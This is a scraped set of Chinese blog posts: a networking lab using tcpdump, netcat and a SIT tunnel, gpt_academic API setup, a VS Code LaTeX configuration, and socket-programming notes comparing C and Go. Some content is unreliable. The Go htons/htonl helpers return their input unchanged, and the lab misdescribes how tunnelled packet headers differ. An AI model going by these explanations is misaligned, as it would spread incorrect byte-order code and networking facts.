链路层地址：fa:16:3e:5b:1a:ea 可达性：可达 这些信息用于告知源地址，目标地址是可达的，并且目标地址的链路层地址是 fa:16:3e:e7:f7:b3。 TCP 三次握手 netcat 可以在主机间建立 TCP 连接，建立连接时，可以用 tcpdump 对 报文抓包，观察到 TCP 的三次握手过程。\n首先在 S 的终端 1 中执行 nc -l 1958 侦听 1958 端口。\n之后在 HostA 的终端1 执行 sudo tcpdump -vxn host HostA 的 IPv4(ens5) 地址 andS 的 IPv4(ens5) 地址 -i ens5\n在HostA 的终端2 执行 nc S 的IPv4(ens5)地址 1958。\n命令解释 nc -l 1958：这个命令使用nc（netcat）工具在本地监听1958端口，等待接收数据。 sudo tcpdump -vxn host HostA 的 IPv4(ens5) 地址 andS 的 IPv4(ens5) 地址 -i ens5：这个命令是用来使用tcpdump工具来捕获网络数据包的命令。其中\u0026quot;-v\u0026quot;表示详细模式，\u0026quot;-x\u0026quot;表示以十六进制和ASCII格式显示数据包，\u0026quot;-n\u0026quot;表示以数字形式显示地址，\u0026quot;-i ens5\u0026quot;表示监听网络接口ens5上的数据包。\u0026ldquo;host HostA 的 IPv4(ens5) 地址 andS 的 IPv4(ens5) 地址\u0026quot;这部分应该是要指定要捕获的数据包的源和目标主机的IP地址。 nc S 的IPv4(ens5)地址 1958：这个命令使用nc（netcat）工具来连接到指定的IPv4地址的主机的1958端口。 结果 【实验要求】：完整记录 HostA 的终端 1 中观察到的前三个报文，即 TCP 握手报文。标注出每个报文的类型（SYN、SYN/ACK、ACK）。简要说明 TCP 协议采用三次握手的原因。说明实验中为何无法抓到 RST 包？请问编写应用程序时我们是否需要处理这些报文，为什么？\nTCP 协议采用三次握手的原因\n确保连接的建立是可靠的。 避免已建立的连接被重复建立。 避免连接被恶意攻击。 在三次握手的过程中，双方主机各发送一个 SYN 报文，然后再各发送一个 ACK 报文。这样，双方主机就可以确认对方是可靠的，并且连接是可靠的。\n实验中无法抓到 RST 包的原因\n在实验中，HostA 和 HostB 建立了 TCP 连接，并开始传输数据。如果 HostA 或 HostB 想要终止连接，则会发送 RST 包。但是，由于实验中我们没有终止连接，因此无法抓到 RST 包。\n如果 HostA 发送了一个无效的 TCP 报文，或者 HostB 拒绝建立连接，则 HostB 可能会发送 RST 包来终止连接。在这种情况下，可以通过 tcpdump 来抓到 RST 包。\n编写应用程序时是否需要处理这些报文\n编写应用程序时，通常不需要直接处理 TCP 握手报文。应用程序可以通过调用系统 API 来建立和管理 TCP 连接。\n隧道 注意 隧道删除命令为 ip tunnel del 隧道名称，若添加隧道命令打错可用此命令删除后重建。\n打开两个 Host 虚拟机并各打开一个终端 在 HostA 的终端上执行命令： sudo ip tunnel add sit1 mode sit remote HostB 的 IPv4 地址 local HostA 的 IPv4 地址 dev ens5（IPv4 地址可以由命令 ifconfig ens5 获得）\nsudo ip link set sit1 up\nip link show up【记录结果，此时可以看到名字为 sit1 的设备】 sudo ip addr add 3ffe:3216:2101:2106:1234::A/80 dev sit1\nip tunnel show【记录结果】 命令解释 sudo ip tunnel add sit1 mode sit remote HostB 的 IPv4 地址 local HostA 的 IPv4 地址 dev ens5：该命令用于创建一个名为 sit1 的隧道接口，该隧道接口的模式为 SIT，远程端地址为 HostB 的 IPv4 地址，本地端地址为 HostA 的 IPv4 地址，隧道接口绑定的物理接口为 ens5。\nsudo ip link set sit1 up：HostA 已经创建了名为 sit1 的隧道接口，但该隧道接口处于禁用状态。通过执行该命令，将 sit1 隧道接口置为启用状态。\nip link show 命令用于显示系统的网络接口信息，包括其当前状态。up 选项只显示当前已启用的网络接口。\nsudo ip addr add 3ffe:3216:2101:2106:1234::A/80 dev sit1 ：该命令用于将 IPv6 地址 3ffe:3216:2101:2106:1234::A 分配给隧道接口 sit1，前缀长度为 80\nip tunnel show 用于显示系统中所有隧道接口的信息。\n在 HostB 的终端上执行命令： sudo ip tunnel add sit1 mode sit remote HostA 的 IPv4 地址 local HostB 的 IPv4 地址 dev ens5（IPv4 地址可以由命令 ifconfig ens5 获得）\nsudo ip link set sit1 up\nip link show up【记录结果，此时可以看到名字为 sit1 的设备】 sudo ip addr add 3ffe:3216:2101:2106:1234::B/80 dev sit1\nip tunnel show【记录结果】 命令解释 sudo ip tunnel add sit1 mode sit remote HostA 的 IPv4 地址 local HostB 的 IPv4 地址 dev ens5 用于创建一个名为 sit1 的隧道接口。该隧道接口使用 SIT 模式，远程端地址为 HostA 的 IPv4 地址，本地端地址为 HostB 的 IPv4 地址。隧道接口绑定到物理接口 ens5。\nsudo ip link set sit1 up ：通过执行该命令，将 sit1 隧道接口置为启用状态。\nip link show 命令用于显示系统的网络接口信息，包括其当前状态。up 选项只显示当前已启用的网络接口。\nsudo ip addr add 3ffe:3216:2101:2106:1234::B/80 dev sit1 用于将 IPv6 地址 3ffe:3216:2101:2106:1234::B 分配给隧道接口 sit1，前缀长度为 80。\nip tunnel show 用于显示系统中所有隧道接口的信息。\n在 HostA 上打开两个终端。 其中一个终端用 tcpdump 侦听报文，另一个终端用于 ping6。\n首先在 HostA 的第 1 个终端中执行命令 sudo tcpdump -vxn -i sit1。\n其次在 HostA 的第 2 个终端中执行命令 ping6 –c 1 3ffe:3216:2101:2106 :1234::B，检查是否可以 ping 通，若不通则需要检查之前的步骤是否正确完成。 记录 HostA 的第 1 个终端中由 tcpdump 抓取的前两个报文。 关闭 HostA 的这两个终端并重新打开两个新的终端。\n在 HostA 的第 1 个终端中执行命令 sudo tcpdump -vxn –i ens5\n在 HostA 的第 2 个终端中执行命令 ping6 –c 1 3ffe:3216:2101:2106:1234::B。 记录 HostA 的第 1 个终端中由 tcpdump 抓取的前两个报文（可能要等一会儿）。 命令解释 sudo tcpdump -vxn -i sit1 用于捕获在隧道接口 sit1 上传输的网络数据包。\nping6 –c 1 3ffe:3216:2101:2106:1234::B该命令将向 IPv6 地址 3ffe:3216:2101:2106:1234::B 发送一个 ICMP 回显请求数据包。如果该地址可达，则目标主机将会响应一个 ICMP 回显应答数据包。\n结果解释 【实验要求】：记录需要记录的实验数据。从报文结构上看，通过隧道通信与两个 IPv6 主机直接通信的区别是什么，即上述隧道通信的报文有什么特点？\n通过隧道通信与两个 IPv6 主机直接通信的区别是什么：\n隧道通信的报文中，IPv6 头部包含了源地址和目标地址，以及隧道协议类型。两个 IPv6 主机直接通信的报文中，IPv6 头部只包含了源地址和目标地址。 隧道通信的报文中，包含了隧道协议头部，用于描述隧道连接的相关信息。两个 IPv6 主机直接通信的报文中，没有隧道协议头部。 ","date":"2023-11-20T10:27:05+08:00","permalink":"https://anonymity-0.github.io/posts/%E4%BF%A1%E7%BD%91%E5%AE%9E%E9%AA%8C2/","title":"信网实验2"},{"content":"项目地址 GitHub - binary-husky/gpt_academic: 为ChatGPT/GLM提供实用化交互界面，特别优化论文阅读/润色/写作体验，模块化设计，支持自定义快捷按钮\u0026amp;函数插件，支持Python和C++等项目剖析\u0026amp;自译解功能，PDF/LaTex论文翻译\u0026amp;总结功能，支持并行问询多种LLM模型，支持chatglm2等本地模型。兼容文心一言, moss, llama2, rwkv, claude2, 通义千问, 书生, 讯飞星火等。\napi配置 openai-api 因为已经有了gpt账户，所以直接在OpenAI Platform上生成一个key就可以了。注意这个key只能看一次。 azure-api 注册 因为注册azure本身需要信用卡，本来不想注册的，突然看到一个博客说azure学生认证之后可以不需要信用卡，试了一下果然可以。注册之后秒通过，科大邮箱还是靠谱的。 注册可以参考学生福利白嫖之路——申请Azure学生订阅 - 知乎\n配置 在搜索栏搜索Openai，然后创建 请求访问Azure OpenAI服务 然后填写问卷，第四个问题需要填写订阅ID， 参考： 获取 Azure 门户中的订阅和租户 ID - Azure portal | Microsoft Learn\n填完问卷之后要等一段时间的审核 星火api 登陆：讯飞开放平台 点击免费试用： 实名认证获得更多token 前往控制台-讯飞开放平台获取自己的key 输入到config.py中 注：需在这个列表添加 智谱清言 前往平台智谱AI开放平台登陆后前往 点击右上角查看apikey 复制key输入config.py的这个部分： 其他api不是需要自己部署就是收费，就不捣鼓了。\n","date":"2023-11-18T17:09:33+08:00","permalink":"https://anonymity-0.github.io/posts/gpt-academic%E6%9C%AC%E5%9C%B0%E9%85%8D%E7%BD%AE/","title":"Gpt Academic本地配置"},{"content":"最近开始要写课程论文了，想着要用latex的模板直接写会方便，又懒得下overleaf，话不多说开始配置\n下载与安装 可以从该镜像下载 [Index of CTAN-local/systems/texlive/Images](https://mirrors.huaweicloud.com/CTAN/systems/texlive/Images/\nmac用户可配置MacTeX - TeX Users Group\n安装vscode插件 LaTeX Workshop\n配置 配置latex-workshop 不包含外部 pdf 查看器设置的配置\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 \u0026#34;latex-workshop.latex.autoBuild.run\u0026#34;: \u0026#34;never\u0026#34;, \u0026#34;latex-workshop.showContextMenu\u0026#34;: true, \u0026#34;latex-workshop.intellisense.package.enabled\u0026#34;: true, \u0026#34;latex-workshop.message.error.show\u0026#34;: false, \u0026#34;latex-workshop.message.warning.show\u0026#34;: false, \u0026#34;latex-workshop.latex.tools\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;xelatex\u0026#34;, \u0026#34;command\u0026#34;: \u0026#34;xelatex\u0026#34;, \u0026#34;args\u0026#34;: [ \u0026#34;-synctex=1\u0026#34;, \u0026#34;-interaction=nonstopmode\u0026#34;, \u0026#34;-file-line-error\u0026#34;, \u0026#34;%DOCFILE%\u0026#34; ] }, { \u0026#34;name\u0026#34;: \u0026#34;pdflatex\u0026#34;, \u0026#34;command\u0026#34;: \u0026#34;pdflatex\u0026#34;, \u0026#34;args\u0026#34;: [ \u0026#34;-synctex=1\u0026#34;, \u0026#34;-interaction=nonstopmode\u0026#34;, \u0026#34;-file-line-error\u0026#34;, \u0026#34;%DOCFILE%\u0026#34; ] }, { \u0026#34;name\u0026#34;: \u0026#34;latexmk\u0026#34;, \u0026#34;command\u0026#34;: \u0026#34;latexmk\u0026#34;, \u0026#34;args\u0026#34;: [ \u0026#34;-synctex=1\u0026#34;, \u0026#34;-interaction=nonstopmode\u0026#34;, \u0026#34;-file-line-error\u0026#34;, \u0026#34;-pdf\u0026#34;, \u0026#34;-outdir=%OUTDIR%\u0026#34;, \u0026#34;%DOCFILE%\u0026#34; ] }, { \u0026#34;name\u0026#34;: \u0026#34;bibtex\u0026#34;, \u0026#34;command\u0026#34;: \u0026#34;bibtex\u0026#34;, \u0026#34;args\u0026#34;: [ \u0026#34;%DOCFILE%\u0026#34; ] } ], \u0026#34;latex-workshop.latex.recipes\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;XeLaTeX\u0026#34;, \u0026#34;tools\u0026#34;: [ \u0026#34;xelatex\u0026#34; ] }, { \u0026#34;name\u0026#34;: \u0026#34;PDFLaTeX\u0026#34;, \u0026#34;tools\u0026#34;: [ \u0026#34;pdflatex\u0026#34; ] }, { \u0026#34;name\u0026#34;: \u0026#34;BibTeX\u0026#34;, \u0026#34;tools\u0026#34;: [ \u0026#34;bibtex\u0026#34; ] }, { \u0026#34;name\u0026#34;: \u0026#34;LaTeXmk\u0026#34;, \u0026#34;tools\u0026#34;: [ \u0026#34;latexmk\u0026#34; ] }, { \u0026#34;name\u0026#34;: \u0026#34;xelatex -\u0026gt; bibtex -\u0026gt; xelatex*2\u0026#34;, \u0026#34;tools\u0026#34;: [ \u0026#34;xelatex\u0026#34;, \u0026#34;bibtex\u0026#34;, \u0026#34;xelatex\u0026#34;, \u0026#34;xelatex\u0026#34; ] }, { \u0026#34;name\u0026#34;: \u0026#34;pdflatex -\u0026gt; bibtex -\u0026gt; pdflatex*2\u0026#34;, \u0026#34;tools\u0026#34;: [ \u0026#34;pdflatex\u0026#34;, \u0026#34;bibtex\u0026#34;, \u0026#34;pdflatex\u0026#34;, \u0026#34;pdflatex\u0026#34; ] }, ], \u0026#34;latex-workshop.latex.clean.fileTypes\u0026#34;: [ \u0026#34;*.aux\u0026#34;, \u0026#34;*.bbl\u0026#34;, \u0026#34;*.blg\u0026#34;, \u0026#34;*.idx\u0026#34;, \u0026#34;*.ind\u0026#34;, \u0026#34;*.lof\u0026#34;, \u0026#34;*.lot\u0026#34;, \u0026#34;*.out\u0026#34;, \u0026#34;*.toc\u0026#34;, \u0026#34;*.acn\u0026#34;, \u0026#34;*.acr\u0026#34;, \u0026#34;*.alg\u0026#34;, \u0026#34;*.glg\u0026#34;, \u0026#34;*.glo\u0026#34;, \u0026#34;*.gls\u0026#34;, \u0026#34;*.ist\u0026#34;, \u0026#34;*.fls\u0026#34;, \u0026#34;*.log\u0026#34;, \u0026#34;*.fdb_latexmk\u0026#34; ], \u0026#34;latex-workshop.latex.autoClean.run\u0026#34;: \u0026#34;onFailed\u0026#34;, \u0026#34;latex-workshop.latex.recipe.default\u0026#34;: \u0026#34;lastUsed\u0026#34;, \u0026#34;latex-workshop.view.pdf.internal.synctex.keybinding\u0026#34;: \u0026#34;double-click\u0026#34; SumatraPDF 安装设置 因为vscode内置的pdf查看器不太好用，可以配置别的pdf查看器。具体配置参考Visual Studio Code (vscode)配置LaTeX - 知乎\n常用latex模板 科大学位论文模板：GitHub - ustctug/ustcthesis: LaTeX template for USTC thesis 国科大学位论文模板：GitHub - mohuangrui/ucasthesis: LaTeX Thesis Template for the University of Chinese Academy of Sciences 国科大大作业论文模板：GitHub - jweihe/UCAS_Latex_Template: 中国科学院大学通用课程大作业模板 ","date":"2023-11-15T21:32:47+08:00","permalink":"https://anonymity-0.github.io/posts/vscode%E9%85%8D%E7%BD%AElatex/","title":"VScode配置Latex"},{"content":"3.1 分配给套接字的IP地址与端口号 网络地址 略\n用于区分套接字的端口号 IP用于区分计算机,只要有IP地址就能向目标主机传输数据,但仅凭这些无法传输给最终的应用程序。假设各位欣赏视频的同时在网上冲浪,这时至少需要1个接收视频数据的套接字和1 个接收网页信息的套接字。问题在于如何区分二者。简言之,传输到计算机的网络数据是发给播放器,还是发送给浏览器?\n若想接收多台计算机发来的数据,则需要相应个数的套接字。那如何区分这些套接字呢? 计算机中一般配有NIC(Network Interface Card,网络接口卡)数据传输设备。通过NIC向计算机内部传输数据时会用到IP。操作系统负责把传递到内部的数据适当分配给套接字,利用端口号。也就是说,通过NIC接收的数据内有端口号,操作系统正是参考此端口号把数据传输给相应端口的套接字 端口号就是在同一操作系统内为区分不同套接字而设置的,因此无法将1个端口号分配给不同套接字。 另外,端口号由16位构成 可分配的端口号范围是0-65535。但0-1023是知名端口(Well-known PORT),一般分配给特定应用程序,所以应当分配此范围之外的值。另外,虽然端口号不能重复,但TCP套接字和UDP套接字不会共用端口号,所以允许重复。例如:如果某TCP 套接字使用9190号端口,则其他TCP套接字就无法使用该端口号,但UDP套接字可以使用。 总之,数据传输目标地址同时包含IP地址和端口号,只有这样,数据才会被传输到最终的目的应用程序(应用程序套接字)。\n3.2 应用程序中使用的IP地址和端口号以结构体的形式给出了定义。本节将以IPv4为中心,围绕此结构体讨论目标地址的表示方法。\n表示IPv4的结构体 填写地址信息时应以如下提问为线索进行\n口 问题1：“采用哪一种地址族？” 口 答案1：“基于IPv4的地址族。” 口问题2：“IP地址是多少？” 口答案2：“211.204.214.76。” 口 问题3：“端口号是多少？” 口 答案3：“2048。” C C语言中IPv4结构体定义为如下形态\n1 2 3 4 5 6 7 struct sockaddr_in { sa_family_t sin_family; //地址族 uint16_t sin_port; //16位TCP/UDP地址 struct in_addr sin_addr; //32位ip地址 char sin_zero[8]; //不使用 }; in_addr定义如下，它用来存放32位IP地址\n1 2 3 4 struct in_addr { In_addr_t s_addr; //32位IPv4地址 } 可以看到 in_addr_t 实际上是 uint32_t也就是无符号32位bit，那为什么需要额外定义这些数据类型呢? 如前所述,这是考虑到扩展性的结果。如果使用int32_t类型的数据,就能保证在任何时候都占用4字节,即使将来用64位表示int类型也是如此。 从之前介绍的代码也可看出,sockaddr_in结构体变量地址值将以如下方式传递给bind函数。\n1 2 3 4 5 struct sockaddr_in serv_addr; ... if(bind(serv_sock,(struct sockaddr * ) \u0026amp;serv_addr, sizeof(Serv_addr))== -1) error_handling(\u0026#34;bind()error\u0026#34;); ... 此处重要的是第二个参数的传递。实际上,bind函数的第二个参数期望得到sockaddr结构体变量地址值,包括地址族、端口号、IP地址等。（此处进行了强制类型转换,将sockaddr_in转成sockaddr）从下列代码也可看出,直接向sockaddr结构体填充这些信息会带来麻烦。\n1 2 3 4 struct sockaddr { sa_family_t char sin_family;//地址族(Address Family) sa_data[14];// 地址信息 } 此结构体成员sa_data保存的地址信息中需包含IP地址和端口号,剩余部分应填充0,这也是bind函数要求的。而这对于包含地址信息来讲非常麻烦,继而就有了新的结构体sockaddr_in。若按照之前的讲解填写sockaddr_in结构体,则将生成符合bind函数要求的字节流。最后转换为sockaddr型的结构体变量,再传递给bind函数即可。\nsin_family 每种协议族适用的地址族均不同。比如,IPv4使用4字节地址族,IPv6使用16字节地址族。 可以参考表3-2保存sin_family地址信息。 sockaddr_in是保存IPv4地址信息的结构体。那为何还需要通过sin_family单独指定地址族信息呢? 这与之前讲过的sockaddr结构体有关。结构体sockaddr并非只次IPv4设计, 这从保存地址信息的数组sa_data长度为14字节也可看出。因此,结构体sockaddr要求在sin_family 中指定地址族信息。为了与sockaddr保持一致,sockaddr_in结构体中也有地址族信息。\nsin_port 该成员保存16位端口号,重点在于,它以网络字节序保存\nsin_addr 该成员保存32位IP地址信息,且也以网络字节序保存。为理解好该成员,应同时观察结构体in_addr。但结构体in_addr声明为uint32_t,因此只需当作32位整数型即可。\nsin_zero 无特殊含义。只是 使结构体sockaddr_in的大小与sockadd结构体保持一致而插入的成员。 必需填充为0,否则无法得到想要的结果。\ngo 在 Go 语言中，类似于 C 语言中 struct sockaddr_in 的结构体是 syscall.SockaddrInet4（对于 IPv4）和 syscall.SockaddrInet6（对于 IPv6）。\n在go中，就没有特别定义in_addr_t，直接使用[4]byte。\n1 2 3 4 5 6 // SockaddrInet4 结构体用于表示一个 IPv4 网络地址。 type SockaddrInet4 struct { Port int // Port 字段表示端口号 Addr [4]byte // Addr 字段表示 IPv4 地址，存储为 4 字节 raw RawSockaddrInet4 // raw 字段是内部使用的原始结构体，用于与系统调用交互 } Port：一个 int 类型的值，表示网络地址的端口号。\nAddr：一个 [4]byte 类型的数组，表示 IPv4 地址。每个字节代表地址的一部分，例如，地址 \u0026ldquo;127.0.0.1\u0026rdquo; 会被表示为 [127, 0, 0, 1]。\nraw：一个 RawSockaddrInet4 类型的值，表示网络地址的底层表示。这个字段通常由系统调用使用，不应在常规 Go 代码中直接使用\nRawSockaddrInet4\n1 2 3 4 5 6 7 8 // RawSockaddrInet4 结构体用于表示一个 IPv4 网络地址的底层结构。 type RawSockaddrInet4 struct { Len uint8 // Len 字段表示此结构体的长度 Family uint8 // Family 字段表示地址族，对于 IPv4，此值通常为 AF_INET Port uint16 // Port 字段表示端口号 Addr [4]byte // Addr 字段表示 IPv4 地址，存储为 4 字节 Zero [8]int8 // Zero 字段是填充字段，用于确保结构体的大小正确 } Go语言也类似，这是go 的bind函数\n1 2 3 4 5 6 7 func Bind(fd int, sa Sockaddr) (err error) { ptr, n, err := sa.sockaddr() if err != nil { return err } return bind(fd, ptr, n) } 在 Go 语言中，syscall.Bind 函数的第二个参数是 Sockaddr 类型，这是一个接口类型，它定义了一些方法，这些方法需要由任何实现该接口的类型来实现。\nSockaddrInet4 和 SockaddrInet6 结构体都实现了 Sockaddr 接口，因此它们可以作为 syscall.Bind 函数的参数。\n当你创建一个 SockaddrInet4 结构体并传递给 syscall.Bind 函数时，Go 语言会自动将 SockaddrInet4 结构体转换为 Sockaddr 接口类型，然后再传递给 syscall.Bind 函数。\n所以，虽然 syscall.Bind 函数的参数类型是 Sockaddr，但你可以传递一个 *SockaddrInet4 或 *SockaddrInet6 结构体给它。\nLen：一个 uint8 类型的值，表示此结构体的长度。\nFamily：一个 uint8 类型的值，表示地址族。对于 IPv4，此值通常为 AF_INET。\nFamily 字段在 RawSockaddrInet4 结构体中用于指定地址族。对于 IPv4 地址，这个字段通常被设置为 AF_INET。 虽然 RawSockaddrInet4 结构体通常用于表示 IPv4 地址，但 Family 字段仍然是必要的，因为它告诉操作系统如何解释这个结构体中的其他字段。例如，Port 和 Addr 字段的解释方式取决于 Family 字段的值。 此外，Family 字段也可以帮助调试和错误检查。例如，如果你看到一个 Family 字段的值不是 AF_INET，但结构体是 RawSockaddrInet4，那么你就知道有些地方出错了。\nPort：一个 uint16 类型的值，表示网络地址的端口号。注意，这个值是网络字节序。\nAddr：一个 [4]byte 类型的数组，表示 IPv4 地址。每个字节代表地址的一部分，例如，地址 \u0026ldquo;127.0.0.1\u0026rdquo; 会被表示为 [127, 0, 0, 1]。\nZero：一个 [8]int8 类型的数组，用于填充，以确保结构体的大小正确。这个字段通常不用于常规编程。（类似sin_zero）\nSockaddrInet4 和 RawSockaddrInet4 两个结构体都包含 Port 和 Addr 字段，但它们的用途是不同的。\nSockaddrInet4 是 Go 语言对网络地址的高级表示，它的 Port 和 Addr 字段类型分别为 int 和 [4]byte，这对于 Go 程序员来说更易于使用。\n而 RawSockaddrInet4 是对系统调用级别的网络地址的低级表示，它的 Port 和 Addr 字段类型分别为 uint16 和 [4]byte，并且 Port 字段是网络字节序，这对于系统调用来说是必须的。\n当你在 Go 代码中创建一个 SockaddrInet4 结构体并传递给如 syscall.Bind 这样的函数时，Go 语言会自动将 SockaddrInet4 结构体转换为 RawSockaddrInet4 结构体，然后再传递给底层的系统调用。这就是为什么 SockaddrInet4 结构体中包含一个 RawSockaddrInet4 字段的原因。\nSockaddrInet4结构体包含了IPv4地址和端口信息，而RawSockaddrInet4结构体则是为了在底层网络编程中使用原始的套接字地址结构而定义的。这种设计可以让网络编程在不同层次上进行操作，同时保持灵活性和可扩展性。\n3.3 网络字节序与地址变换 不同CPU中,4字节整数型值1在内存空间的保存方式是不同的。4字节整数型值1可用2进制表示如下。 00000000 00000000 00000000 00000001 有些CPU以这种顺序保存到内存,另外一些CPU则以倒序保存。 00000001 00000000 00000000 00000000 若不考虑这些就收发数据则会发生问题,因为保存顺序的不同意味着对接收数据的解析顺序也不同。\n字节序与网络字节序 CPU向内存保存数据的方式有2种,这意味着CPU解析数据的方式也分为2种。\n大端序(Big Endian):高位字节存放到低位地址。 小端序(Little Endian):高位字节存放到高位地址。 每种CPU的数据保存方式均不同。因此, 代表CPU数据保存方式的主机字节序(Host Byte Order)在不同CPU中也各不相同。目前主流的Intel系列CPU以小端序方式保存数据。接下来分析2台字节序不同的计算机之间数据传递过程中可能出现的问题 0x12和0x34构成的大端序系统值与0x34和0x12构成的小端序系统值相同。换言之,只有改变数据保存顺序才能被识别为同一值。图3-6中,大端序系统传输数据0x1234时未考虑字节序问题, 而直接以Ox12、0x34的顺序发送。结果接收端以小端序方式保存数据,因此小端序接收的数据变成0x3412,而非0x1234。正因如此,在通过网络传输数据时约定统一方式,这种约定称为网络字节序(Network Byte Order) 非常简单：统一为大端序。 即,先把数据数组转化成大端序格式再进行网络传输。因此,所有计算机接收数据时应识别该数据是网络字节序格式,小端序系统传输数据时应转化为大端序排列方式。 字节序转换 接下来介绍帮助转换字节序的函数。这是文中给的c语言转换函数 在 Go 语言中，没有内置的 htons（Host TO Network Short）、ntohs（Network TO Host Short）、htonl（Host TO Network Long）和 ntohl（Network TO Host Long）函数。这些函数在 C 语言中用于在主机字节序和网络字节序之间转换数据。\n但是，你可以使用 Go 语言的 encoding/binary 包来实现同样的功能。以下是如何在 Go 语言中实现这些函数的例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 package main import ( \u0026#34;encoding/binary\u0026#34; \u0026#34;fmt\u0026#34; ) func htons(n uint16) uint16 { var b [2]byte binary.BigEndian.PutUint16(b[:], n) return binary.BigEndian.Uint16(b[:]) } func ntohs(n uint16) uint16 { return htons(n) // 在 16 位无符号整数上，ntohs 和 htons 是相同的 } func htonl(n uint32) uint32 { var b [4]byte binary.BigEndian.PutUint32(b[:], n) return binary.BigEndian.Uint32(b[:]) } func ntohl(n uint32) uint32 { return htonl(n) // 在 32 位无符号整数上，ntohl 和 htonl 是相同的 } func main() { fmt.Println(htons(12345)) // 输出：12345 fmt.Println(ntohs(12345)) // 输出：12345 fmt.Println(htonl(12345)) // 输出：12345 fmt.Println(ntohl(12345)) // 输出：12345 } endian_conv.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 package main import ( \u0026#34;encoding/binary\u0026#34; \u0026#34;fmt\u0026#34; ) // htons 函数接收一个 uint16 类型的主机字节序值， // 将其转换为网络字节序，然后返回转换后的值。 func htons(n uint16) uint16 { b := make([]byte, 2) // 创建一个长度为 2 的字节数组 binary.BigEndian.PutUint16(b, n) // 将 n 的值以大端字节序放入字节数组 return binary.BigEndian.Uint16(b) // 从字节数组中读取并返回大端字节序的值 } // htonl 函数接收一个 uint32 类型的主机字节序值， // 将其转换为网络字节序，然后返回转换后的值。 func htonl(n uint32) uint32 { b := make([]byte, 4) // 创建一个长度为 4 的字节数组 binary.BigEndian.PutUint32(b, n) // 将 n 的值以大端字节序放入字节数组 return binary.BigEndian.Uint32(b) // 从字节数组中读取并返回大端字节序的值 } func main() { hostPort := uint16(0x1234) // 定义一个主机字节序的端口值 hostAddr := uint32(0x12345678) // 定义一个主机字节序的地址值 netPort := htons(hostPort) // 将主机字节序的端口值转换为网络字节序 netAddr := htonl(hostAddr) // 将主机字节序的地址值转换为网络字节序 3.4 网络地址的初始化与分配 将字符串信息转换为网络字节序的整数型 sockaddr_in中保存地址信息的成员为32位整数型。因此,为了分配IP地址,需要将其表示为32位整数型数据。这对于只熟悉字符串信息的我们来说实非易事。\n对于IP地址的表示,我们熟悉的是点分十进制表示法(Dotted Decimal Notation),而非整数型数据表示法。幸运的是,有个函数会帮我们将字符串形式的IP地址转换成32位整数型数据。此函数在转换类型的同时进行网络字节序转换。\ninet_addr 1 2 3 #include \u0026lt;arpa/inet.h\u0026gt; in_addr_t inet_addr(const char * string); //成功时返回32位大端序整数型值,失败时返回 INADDR_NONE。 如果向该函数传递类似“211.214.107.99”的点分十进制格式的字符串,它会将其转换为32 位整数型数据并返回。当然,该整数型值满足网络字节序。另外,该函数的返回值类型in_addr_t 在内部声明为32位整数型。\n在 Go 中，你可以使用 net 包的 ParseIP 函数来解析 IP 地址。这个函数可以处理 IPv4 和 IPv6 地址，如果输入的字符串不是有效的 IP 地址，它会返回 nil。然后，你可以使用 encoding/binary 包的 BigEndian.Uint32 或 LittleEndian.Uint32 函数将 net.IP 类型的 IP 地址转换为网络字节序或主机字节序的整数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 package main import ( \u0026#34;encoding/binary\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;net\u0026#34; ) func main() { ip := net.ParseIP(\u0026#34;1.2.3.4\u0026#34;) if ip == nil { fmt.Println(\u0026#34;Invalid IP address\u0026#34;) return } ip = ip.To4() if ip == nil { fmt.Println(\u0026#34;Not an IPv4 address\u0026#34;) return } fmt.Printf(\u0026#34;IP as integer (network byte order): %x\\n\u0026#34;, binary.BigEndian.Uint32(ip)) fmt.Printf(\u0026#34;IP as integer (host byte order): %x\\n\u0026#34;, binary.LittleEndian.Uint32(ip)) } inter_addr.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 package main import ( \u0026#34;encoding/binary\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;net\u0026#34; ) const INADDR_NONE = 0xffffffff // inet_addr converts an IPv4 address in dot-decimal notation into a 32-bit integer in network byte order. // If the IP address is invalid, it returns INADDR_NONE (0xffffffff). func inet_addr(ipStr string) uint32 { ip := net.ParseIP(ipStr) if ip == nil { return 0xffffffff } ip = ip.To4() if ip == nil { return 0xffffffff } return binary.BigEndian.Uint32(ip) } func main() { addr1 := \u0026#34;1.2.3.4\u0026#34; addr2 := \u0026#34;1.2.3.256\u0026#34; conv_addr := inet_addr(addr1) if conv_addr == INADDR_NONE { fmt.Println(\u0026#34;Error occured!\u0026#34;) } else { fmt.Printf(\u0026#34;Network ordered integer addr: %#x\\n\u0026#34;, conv_addr) } conv_addr = inet_addr(addr2) if conv_addr == INADDR_NONE { fmt.Println(\u0026#34;Error occured!\u0026#34;) } else { fmt.Printf(\u0026#34;Network ordered integer addr: %#x\\n\u0026#34;, conv_addr) } } inet_aton inet_aton函数 与inet_addr函数在功能上完全相同,也将字符串形式IP地址转换为32位网络字节序整数并返回。只不过该函数利用了in_addr结构体,且其使用频率更高。\n1 2 3 4 5 #include \u0026lt;arpa/inet.h\u0026gt; int inet_aton(const char * string,struct in_addn * addn); //成功时返回1(true),失败时返回 0(false)。 //string 含有需转换的IP地址信息的字符串地址值。 //addr 将保存转换结果的in_addr结构体变量的地址值。 inet_aton.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 package main import ( \u0026#34;encoding/binary\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net\u0026#34; ) // inet_aton converts an IPv4 address in dot-decimal notation into a 